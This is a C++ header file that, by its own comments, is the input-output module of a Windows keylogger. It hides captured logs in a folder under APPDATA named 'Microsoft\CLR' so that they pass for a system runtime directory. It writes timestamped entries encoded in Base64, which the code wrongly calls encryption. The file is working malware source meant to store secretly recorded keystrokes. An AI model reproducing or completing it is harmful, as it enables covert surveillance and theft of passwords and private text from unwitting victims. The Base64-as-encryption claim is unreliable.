#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

using namespace std;

// this will used for Input-Output Operations

namespace IO {
	// keylogger directory
	string GetPath (const bool append_separator = false) {
		string appdata_dir(getenv("APPDATA")); // getting the directory path (current user APPDATA)
		string full = appdata_dir + "\\Microsoft\\CLR"; // prefix directory
		return full + (append_separator ? "\\" : ""); // set the \ if needed at the end
	}
	// creates a directory = returns true if success
	bool MkOneDr(string path) {
		// Windows API for mkdir -> if exists also is OK operation
		return (bool) CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
	}
	// backup function for creating directories internals
	bool MKDir(string path) {
		for(char &c: path) {
			if(c == '\\') { // checks for a backlash (\)
				c='\0'; // null terminator
				if(!MkOneDr(path)) { // creating the directory evaluation
					return false;
				}
				c='\\';
			}
		}
		return true;
	}
	
	template <class T>
	string WriteLog (const T &t) {
		string path = GetPath(true); // getting the path
		Helper::DateTime dt;
		string name = dt.GetDateTimeString("_")	+ ".log"; //naming the log file
		// outputtin to the file
		try {
			ofstream file(path + name);
			if(!file) return "";
			ostringstream s; // formatting response
			s << "[" << dt.GetDateTimeString() << "]" << endl << t <<endl;
			string data = Base64::EncryptB64(s.str()); // encrypting the output
			file << data; // send it to file
			if(!file) {
				return "";
			}
			file.close();
			return name;
		} catch (...) {
			return "";
		}
	}	
}

#endif
